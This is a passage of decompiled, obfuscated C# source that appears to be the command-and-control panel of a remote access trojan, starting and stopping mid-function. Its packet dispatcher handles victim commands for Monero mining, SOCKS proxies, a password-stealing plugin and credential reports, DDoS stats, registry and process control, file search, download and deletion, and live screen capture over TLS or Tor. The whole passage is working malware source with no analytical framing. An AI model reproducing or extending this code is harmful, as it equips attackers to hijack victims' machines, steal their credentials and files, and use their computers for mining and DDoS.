																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex91)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr64_mine_ready", true) == 0)
																		{
																			string sKey18 = cclient207.sKey;
																			string string_17 = "xmr64_mine_start|" + cclient207.MINER_LAST_SETTINGS;
																			string string_18 = sKey18;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex92)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr_mine_stats", true) == 0)
																		{
																			if (Class130.fMinerXMR_0.Visible)
																			{
																				Class130.fMinerXMR_0.method_1(cclient207.sKey, class6.class152_0.string_0);
																			}
																		}
																		else if (Operators.CompareString(left3, "xmr_mine_log", true) == 0)
																		{
																			Class130.fMinerXMRLogManager_0.method_0(cclient207.sKey, cclient207.sIP + "^" + cclient207.sUser, class6.class152_0.string_0[0]);
																		}
																		else if (Operators.CompareString(left3, "socks4r_start", true) == 0)
																		{
																			Class130.fSocks4R_0.method_0(cclient207.sKey, cclient207.sUser, class6.class152_0.string_0[0], class6.class152_0.string_0[1]);
																		}
																		else if (Operators.CompareString(left3, "socks4r_stop", true) == 0)
																		{
																			Class130.fSocks4R_0.method_1(cclient207.sKey);
																		}
																		else if (Operators.CompareString(left3, "socks4r_stats", true) == 0)
																		{
																			Class130.fSocks4R_0.method_2(cclient207.sKey, class6.class152_0.string_0);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_start", true) == 0)
																		{
																			Class130.fSocks5_0.method_1(cclient207.sKey, cclient207.sUser, class6.class152_0.string_0[0], class6.class152_0.string_0[1]);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_stop", true) == 0)
																		{
																			Class130.fSocks5_0.method_2(cclient207.sKey);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_stats", true) == 0)
																		{
																			Class130.fSocks5_0.method_3(cclient207.sKey, class6.class152_0.string_0);
																		}
																		else
																		{
																			if (Operators.CompareString(left3, "plg_loader", true) == 0)
																			{
																				string sKey19 = cclient207.sKey;
																				string[] array18 = new string[6];
																				array18[0] = "plg_loader_data|";
																				array18[1] = class6.class152_0.string_0[0];
																				array18[2] = "|";
																				int num168 = 3;
																				string text22 = Application.StartupPath + "\\data\\plugins\\loader.plg";
																				array18[num168] = Class136.smethod_29(ref text22);
																				array18[4] = "|";
																				int num169 = 5;
																				text22 = Application.StartupPath + "\\data\\plugins\\loader.plg";
																				array18[num169] = Class136.smethod_13(ref text22);
																				string string_17 = string.Concat(array18);
																				string string_18 = sKey19;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_DDCE;
																				}
																				catch (Exception ex93)
																				{
																					goto IL_DDCE;
																				}
																			}
																			if (Operators.CompareString(left3, "crd_logins_req", true) == 0)
																			{
																				if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																				{
																					goto IL_DDCE;
																				}
																				string sKey20 = cclient207.sKey;
																				string str53 = "crd_logins_data|";
																				string text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string str54 = Class136.smethod_29(ref text22);
																				string str55 = "|";
																				text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string string_17 = str53 + str54 + str55 + Class136.smethod_13(ref text22);
																				string string_18 = sKey20;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_DDCE;
																				}
																				catch (Exception ex94)
																				{
																					goto IL_DDCE;
																				}
																			}
																			if (Operators.CompareString(left3, "crd_logins", true) == 0)
																			{
																				if (cclient207.fDB == null)
																				{
																					CClient cclient254 = cclient207;
																					bool flag7 = true;
																					cclient254.SOCKET_DISCONNECT(ref flag7);
																					goto IL_DE40;
																				}
																				cclient207.fDB.method_2(ref class6.class152_0.string_0[0]);
																			}
																			else
																			{
																				if (Operators.CompareString(left3, "crd_logins_report_req", true) == 0)
																				{
																					if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																					{
																						goto IL_DDCE;
																					}
																					string sKey21 = cclient207.sKey;
																					string str56 = "crd_logins_report_data|";
																					string text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																					string str57 = Class136.smethod_29(ref text22);
																					string str58 = "|";
																					text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																					string string_17 = str56 + str57 + str58 + Class136.smethod_13(ref text22);
																					string string_18 = sKey21;
																					Class136.Class138 class4 = new Class136.Class138();
																					class4.string_0 = string_18;
																					class4.string_1 = string_17;
																					class4.long_0 = 0L;
																					try
																					{
																						if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																						{
																							new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																						}
																						goto IL_DDCE;
																					}
																					catch (Exception ex95)
																					{
																						goto IL_DDCE;
																					}
																				}
																				if (Operators.CompareString(left3, "crd_logins_report", true) == 0)
																				{
																					Class130.fCredentialsLogins_0.method_3(cclient207.sKey, cclient207.sIP + "^" + cclient207.sUser, class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_info", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient255 = cclient207;
																						bool flag7 = true;
																						cclient255.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_98(ref class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_error", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient256 = cclient207;
																						bool flag7 = true;
																						cclient256.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_99(ref class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_stop", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient257 = cclient207;
																						bool flag7 = true;
																						cclient257.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_97();
																				}
																				else if (Operators.CompareString(left3, "speedtest", true) == 0)
																				{
																					cclient207.sBandwidthDL = class6.class152_0.string_0[0];
																				}
																				else if (Operators.CompareString(left3, "speedtest_started", true) == 0)
																				{
																					cclient207.BANDWIDTHDL = "...";
																				}
																				else if (Operators.CompareString(left3, "soft_list", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient258 = cclient207;
																						bool flag7 = true;
																						cclient258.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__17)).Start();
																				}
																				else if (Operators.CompareString(left3, "thumb_data", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient259 = cclient207;
																						bool flag7 = true;
																						cclient259.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.fThumb_0.method_2();
																					MemoryStream stream9 = new MemoryStream(Convert.FromBase64String(class6.class152_0.string_0[0]));
																					cclient207.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream9);
																				}
																				else if (Operators.CompareString(left3, "ddos_stats", true) == 0)
																				{
																					if (Class130.fDDOS_0.Visible)
																					{
																						Class130.fDDOS_0.method_1(cclient207.sKey, class6.class152_0.string_0);
																					}
																				}
																				else if (Operators.CompareString(left3, "ddos_stop", true) == 0)
																				{
																					Class130.fDDOS_0.method_2(cclient207.sKey);
																				}
																				else if (Operators.CompareString(left3, "reg_hkeys_get", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient260 = cclient207;
																						bool flag7 = true;
																						cclient260.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__18)).Start();
																				}
																				else if (Operators.CompareString(left3, "reg_keys_get", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient261 = cclient207;
																						bool flag7 = true;
																						cclient261.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__19)).Start();
																				}
																				else if (Operators.CompareString(left3, "scr_tb", true) == 0)
																				{
																					if (Class135.smethod_0().UIThumbnails)
																					{
																						MemoryStream stream10 = new MemoryStream(Convert.FromBase64String(class6.class152_0.string_0[0]));
																						cclient207.ICO_STATUS = Image.FromStream(stream10);
																						Class130.imageList_1.Images.Add(cclient207.sKey, cclient207.ICO_STATUS);
																						Class130.fMain_0.method_5(true);
																					}
																				}
																				else if (Operators.CompareString(left3, "dl_dir_obj_count", true) == 0)
																				{
																					Class130.concurrentDictionary_1.TryAdd(class6.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class6.class152_0.string_0[1])));
																				}
																				else if (cclient207.fDB == null)
																				{
																					CClient cclient262 = cclient207;
																					bool flag7 = true;
																					cclient262.SOCKET_DISCONNECT(ref flag7);
																					goto IL_DE40;
																				}
																			}
																		}
																	}
																}
															}
															IL_DDCE:
															fMain ff21 = cclient207.ff;
															CClient cclient263 = cclient207;
															ptr15 = ref cclient263.sKey;
															object value5 = cclient263.sKey;
															ff21.method_24(ref value5);
															ptr15 = Conversions.ToString(value5);
															goto IL_DE40;
														}
														catch (Exception ex96)
														{
															Class130.concurrentDictionary_3[cclient207.sKey].sPacket.Clear();
															goto IL_DE40;
														}
														goto IL_DE1F;
														IL_DE40:
														num170 += unchecked((long)(checked(array14[(int)num147].Length + 1)));
													}
													IL_DE2D:
													num147 += 1L;
													continue;
													IL_DE1F:
													num170 += 1L;
													goto IL_DE2D;
												}
												cclient205.sPacket = new StringBuilder(Strings.Mid(cclient205.sPacket.ToString(), (int)(num170 + 1L)));
											}
										}
										fMain ff22 = cclient205.ff;
										CClient cclient264 = cclient205;
										ref string ptr16 = ref cclient264.sKey;
										object value6 = cclient264.sKey;
										ff22.method_24(ref value6);
										ptr16 = Conversions.ToString(value6);
									}
									catch (Exception ex97)
									{
										cclient205.sPacket.Clear();
										flag8 = false;
										goto IL_DEC7;
									}
									flag8 = true;
									IL_DEC7:
									if (flag8)
									{
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										CClient cclient265 = cclient2;
										ptr2 = ref cclient265.stats_bytes_in;
										cclient265.stats_bytes_in = ptr2 + (double)num;
									}
								}
							}
						}
					}
					IL_DF07:
					if (cclient2.sock_async.socket_0.Connected)
					{
						return;
					}
				}
			}
			catch (Exception ex98)
			{
			}
			IL_DF2C:
			if (!cclient2.FILE_TRANSFER_ISPAUSED)
			{
				CClient cclient266 = cclient2;
				bool flag3 = true;
				cclient266.SOCKET_DISCONNECT(ref flag3);
			}
		}
	}

	// Token: 0x06001382 RID: 4994 RVA: 0x0009BA64 File Offset: 0x00099C64
	private void method_33(string string_0)
	{
		fMain fMain = this;
		CClient cclient = new CClient(ref fMain, string_0, this.vmethod_2().method_10(string_0), false);
		if (Class130.concurrentDictionary_3.TryAdd(cclient.sKey, cclient))
		{
			IPEndPoint ipendPoint = (IPEndPoint)Class130.concurrentDictionary_3[string_0].sock_async.socket_0.LocalEndPoint;
			Class130.fConnectionLog_0.method_1(Class130.concurrentDictionary_3[string_0].sIP + ":" + Class130.concurrentDictionary_3[string_0].sPort, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(Class130.concurrentDictionary_3[string_0].IS_SSL, "TLS 1.2", "Tor"), ", src: "), ipendPoint.Port)), 1);
		}
	}

	// Token: 0x06001383 RID: 4995 RVA: 0x0009BB34 File Offset: 0x00099D34
	private void method_34(string string_0, string string_1, string string_2, bool bool_0)
	{
		Class130.fConnectionLog_0.method_1(string_1 + ":" + string_2, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(bool_0, "TLS 1.2", "Tor"), ", src: "), this.vmethod_2().int_0)), 2);
		if (Class130.concurrentDictionary_3.ContainsKey(string_0) && !Class130.concurrentDictionary_3[string_0].FILE_TRANSFER_ISPAUSED)
		{
			CClient cclient = Class130.concurrentDictionary_3[string_0];
			bool flag = true;
			cclient.SOCKET_DISCONNECT(ref flag);
		}
	}

	// Token: 0x06001384 RID: 4996 RVA: 0x0008D1C8 File Offset: 0x0008B3C8
	private void method_35(string string_0, byte[] byte_0)
	{
		if (Class130.concurrentDictionary_3.ContainsKey(string_0))
		{
			CClient cclient = Class130.concurrentDictionary_3[string_0];
			ref byte[] ptr = ref byte_0;
			CClient cclient2 = cclient;
			int num = ptr.Length;
			try
			{
				if (cclient2.SCREENLIVE_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient3 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY];
					ptr2 = ref cclient3.stats_bytes_in;
					cclient3.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient4 = cclient2;
							try
							{
								if (!cclient4.IS_SSL)
								{
									cclient4.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient4.SCREENLIVE_USER_KEY].fDB.vmethod_24().Image = Image.FromStream(new MemoryStream(cclient4.mPacket.ToArray()));
								Class130.concurrentDictionary_3[cclient4.SCREENLIVE_USER_KEY].SCREEN_FPS_UPDATE((double)cclient4.mPacket.Length);
								cclient4.mPacket.SetLength(0L);
							}
							catch (Exception ex)
							{
								cclient4.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SOCKET_COMMAND_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient5 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
					ptr2 = ref cclient5.stats_bytes_in;
					cclient5.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					if (Encoding.UTF8.GetString(ptr, 0, num).EndsWith("@"))
					{
						CClient cclient6 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
						string left = Encoding.UTF8.GetString(cclient2.mPacket.ToArray());
						ref string ptr3 = ref left;
						CClient cclient7 = cclient6;
						CClient.Class152 @class = new CClient.Class152();
						@class.cclient_0 = cclient7;
						checked
						{
							if (ptr3.EndsWith("@"))
							{
								ptr3 = ptr3.Remove(ptr3.Length - 1);
							}
							string[] array = Strings.Split(ptr3, "|", 4, CompareMethod.Text);
							fMain ff = cclient7.ff;
							CClient cclient8 = cclient7;
							long num2 = Class136.smethod_36();
							string[] array2 = array;
							int num3 = 1;
							ref string ptr4 = ref array2[num3];
							long value = Conversions.ToLong(array2[num3]);
							ff.method_19(ref cclient8, ref num2, ref value);
							ptr4 = Conversions.ToString(value);
							try
							{
								CClient.Class151 class2 = new CClient.Class151();
								class2.class152_0 = @class;
								class2.byte_0 = Convert.FromBase64String(array[3]);
								class2.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array[3])), "|", -1, CompareMethod.Text);
								long num4 = Conversions.ToLong(array[2]);
								string left2 = Strings.LCase(array[0]);
								if (Operators.CompareString(left2, "cli_sleep", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_hib", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_log", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_rs", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_off", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "con", true) == 0)
								{
									int num5 = class2.class152_0.string_0.Length;
									if (num5 != 15)
									{
										if (num5 == 16)
										{
											fMain ff2 = cclient7.ff;
											cclient8 = cclient7;
											ff2.method_20(ref cclient8, ref class2.class152_0.string_0[0], ref class2.class152_0.string_0[1], ref class2.class152_0.string_0[2], ref class2.class152_0.string_0[3], ref class2.class152_0.string_0[4], ref class2.class152_0.string_0[5], ref class2.class152_0.string_0[6], ref class2.class152_0.string_0[7], ref class2.class152_0.string_0[8], ref class2.class152_0.string_0[9], ref class2.class152_0.string_0[10], ref class2.class152_0.string_0[11], ref class2.class152_0.string_0[12], ref class2.class152_0.string_0[13], ref class2.class152_0.string_0[14], ref class2.class152_0.string_0[15]);
										}
									}
									else
									{
										fMain ff3 = cclient7.ff;
										cclient8 = cclient7;
										string[] string_ = class2.class152_0.string_0;
										int num6 = 0;
										string[] string_2 = class2.class152_0.string_0;
										int num7 = 1;
										string[] string_3 = class2.class152_0.string_0;
										int num8 = 2;
										string[] string_4 = class2.class152_0.string_0;
										int num9 = 3;
										string[] string_5 = class2.class152_0.string_0;
										int num10 = 4;
										string[] string_6 = class2.class152_0.string_0;
										int num11 = 5;
										string[] string_7 = class2.class152_0.string_0;
										int num12 = 6;
										string[] string_8 = class2.class152_0.string_0;
										int num13 = 7;
										string[] string_9 = class2.class152_0.string_0;
										int num14 = 8;
										string[] string_10 = class2.class152_0.string_0;
										int num15 = 9;
										string[] string_11 = class2.class152_0.string_0;
										int num16 = 10;
										string[] string_12 = class2.class152_0.string_0;
										int num17 = 11;
										string[] string_13 = class2.class152_0.string_0;
										int num18 = 12;
										string[] string_14 = class2.class152_0.string_0;
										int num19 = 13;
										string[] string_15 = class2.class152_0.string_0;
										int num20 = 14;
										string text = "Default";
										ff3.method_20(ref cclient8, ref string_[num6], ref string_2[num7], ref string_3[num8], ref string_4[num9], ref string_5[num10], ref string_6[num11], ref string_7[num12], ref string_8[num13], ref string_9[num14], ref string_10[num15], ref string_11[num16], ref string_12[num17], ref string_13[num18], ref string_14[num19], ref string_15[num20], ref text);
									}
								}
								else if (Operators.CompareString(left2, "info", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient9 = cclient7;
										bool flag = true;
										cclient9.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__0)).Start();
								}
								else if (Operators.CompareString(left2, "drives_get", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient10 = cclient7;
										bool flag = true;
										cclient10.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__1)).Start();
								}
								else if (Operators.CompareString(left2, "files_get", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient11 = cclient7;
										bool flag = true;
										cclient11.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__2)).Start();
								}
								else if (Operators.CompareString(left2, "files_search", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient12 = cclient7;
										bool flag = true;
										cclient12.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], class2.class152_0.string_0[3], class2.class152_0.string_0[4], class2.class152_0.string_0[5], string.Empty, string.Empty);
								}
								else if (Operators.CompareString(left2, "files_search_error_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient13 = cclient7;
										bool flag = true;
										cclient13.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_2(class2.class152_0.string_0[0]);
								}
								else if (Operators.CompareString(left2, "files_search_error_file", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient14 = cclient7;
										bool flag = true;
										cclient14.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], "N/A", class2.class152_0.string_0[3], "N/A", string.Empty, class2.class152_0.string_0[4]);
								}
								else if (Operators.CompareString(left2, "files_search_path", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient15 = cclient7;
										bool flag = true;
										cclient15.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_8(class2.class152_0.string_0[0]);
									cclient7.fSrch.method_1(class2.class152_0.string_0[1]);
								}
								else if (Operators.CompareString(left2, "files_search_done", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient16 = cclient7;
										bool flag = true;
										cclient16.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_5(true, class2.class152_0.string_0[0]);
								}
								else if (Operators.CompareString(left2, "files_zip_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient17 = cclient7;
										bool flag = true;
										cclient17.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__3)).Start();
								}
								else if (Operators.CompareString(left2, "files_zip", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient18 = cclient7;
										bool flag = true;
										cclient18.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__4)).Start();
								}
								else if (Operators.CompareString(left2, "files_zip_end", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient19 = cclient7;
										bool flag = true;
										cclient19.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__5)).Start();
								}
								else if (Operators.CompareString(left2, "files_delete_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient20 = cclient7;
										bool flag = true;
										cclient20.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									string text = "0";
									fDB.method_4(ref value, ref text);
								}
								else if (Operators.CompareString(left2, "files_delete", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient21 = cclient7;
										bool flag = true;
										cclient21.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB2 = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									fDB2.method_4(ref value, ref class2.class152_0.string_0[1]);
								}
								else if (Operators.CompareString(left2, "files_delete_end", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient22 = cclient7;
										bool flag = true;
										cclient22.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB3 = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									fDB3.method_4(ref value, ref class2.class152_0.string_0[1]);
								}
								else
								{
									if (Operators.CompareString(left2, "files_download", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient23 = cclient7;
											bool flag = true;
											cclient23.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										string text2 = string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											Strings.Replace(cclient7.sUser, "\\", "^", 1, -1, CompareMethod.Text),
											"\\",
											Strings.Replace(class2.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
										});
										byte[] array3 = Convert.FromBase64String(class2.class152_0.string_0[1]);
										bool flag2 = true;
										byte[] byte_ = array3;
										string string_16 = text2;
										Class136.Class142 class3 = new Class136.Class142();
										class3.string_0 = string_16;
										class3.byte_0 = byte_;
										class3.bool_0 = false;
										try
										{
											if (flag2)
											{
												new Thread(new ThreadStart(class3._Lambda$__0)).Start();
											}
											else
											{
												Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
											}
											goto IL_2352;
										}
										catch (Exception ex2)
										{
											goto IL_2352;
										}
									}
									if (Operators.CompareString(left2, "prc_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient24 = cclient7;
											bool flag = true;
											cclient24.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__6)).Start();
									}
									else if (Operators.CompareString(left2, "prc_kill", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient25 = cclient7;
											bool flag = true;
											cclient25.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__7)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient26 = cclient7;
											bool flag = true;
											cclient26.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__8)).Start();
									}
									else if (Operators.CompareString(left2, "srv_start", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient27 = cclient7;
											bool flag = true;
											cclient27.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__9)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_control", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient28 = cclient7;
											bool flag = true;
											cclient28.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__10)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_uninstall", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient29 = cclient7;
											bool flag = true;
											cclient29.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__11)).Start();
										}
									}
									else if (Operators.CompareString(left2, "wnd_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient30 = cclient7;
											bool flag = true;
											cclient30.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__12)).Start();
									}
									else if (Operators.CompareString(left2, "wnd_cmd", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient31 = cclient7;
											bool flag = true;
											cclient31.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__13)).Start();
										}
									}
									else if (Operators.CompareString(left2, "wnd_title", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient32 = cclient7;
											bool flag = true;
											cclient32.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__14)).Start();
										}
									}
									else if (Operators.CompareString(left2, "screenlive", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient33 = cclient7;
											bool flag = true;
											cclient33.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (num4 - 1L == unchecked((long)array[3].Length))
										{
											MemoryStream stream = new MemoryStream(class2.byte_0);
											cclient7.fDB.vmethod_24().Image = Image.FromStream(stream);
											cclient7.SCREEN_FPS_UPDATE((double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4));
										}
									}
